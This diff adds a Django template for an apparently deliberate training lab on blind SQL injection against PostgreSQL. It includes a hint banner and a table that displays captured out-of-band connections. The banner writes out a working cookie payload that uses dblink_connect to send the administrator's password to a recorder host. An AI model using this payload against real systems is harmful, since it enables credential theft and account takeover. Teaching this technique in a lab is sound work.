@@ -1,0 +1,71 @@
+{% extends "shop/base.html" %}
+{% block title %}Home &mdash; We Like To Shop{% endblock %}
+
+{% block content %}
+    <div class="hint-banner">
+        <strong>Lab briefing:</strong> the site looks up the <code>TrackingId</code>
+        cookie against a <code>tracked_users</code> table. The result is never
+        reflected, any SQL error is swallowed, and there is no timing gate - the
+        response body is identical regardless of what the payload does. There is
+        no in-band channel at all.
+        <br><br>
+        The backend is PostgreSQL with the <code>dblink</code> extension enabled,
+        and an out-of-band recorder is running on
+        <code>{{ oob_hostname }}:5432</code> on the compose network. That recorder
+        parses the Postgres wire-protocol startup message of every inbound
+        connection, so any value embedded in a libpq connection parameter shows
+        up verbatim below.
+        <br><br>
+        Exfiltrate the administrator password into a connection-string parameter
+        in one shot, e.g.
+        <br>
+        <code>TrackingId=x'||(SELECT dblink_connect('host={{ oob_hostname }} port=5432 sslmode=disable user='||(SELECT password FROM users WHERE username='administrator')||' password=x dbname=x'))||'</code>
+        <br><br>
+        Read the password out of the table below, then
+        <a href="{% url 'login' %}">sign in as administrator</a> to claim the flag.
+    </div>
+
+    <div class="card">
+        <h1>Welcome</h1>
+        <p>Browse our collection.</p>
+        <p>Out-of-band recorder: <span class="pill">{{ oob_hostname }}:5432</span>
+           &mdash; connections observed: <span class="pill">{{ oob_entry_count }}</span></p>
+    </div>
+
+    {% if oob_entries %}
+        <div class="card">
+            <h2>Recorded connections</h2>
+            <table class="oob">
+                <thead>
+                    <tr>
+                        <th>Timestamp (UTC)</th>
+                        <th>Peer</th>
+                        <th>Parsed Postgres startup parameters</th>
+                        <th>Raw bytes</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for entry in oob_entries %}
+                        <tr>
+                            <td class="mono">{{ entry.timestamp }}</td>
+                            <td class="mono">{{ entry.peer }}</td>
+                            <td>
+                                {% if entry.pg_params %}
+                                    <dl class="params">
+                                        {% for key, value in entry.pg_params.items %}
+                                            <dt>{{ key }}</dt>
+                                            <dd>{{ value }}</dd>
+                                        {% endfor %}
+                                    </dl>
+                                {% else %}
+                                    <span class="mono">&mdash;</span>
+                                {% endif %}
+                            </td>
+                            <td class="mono">{{ entry.bytes }} B<br>{{ entry.preview_hex }}</td>
+                        </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    {% endif %}
+{% endblock %}
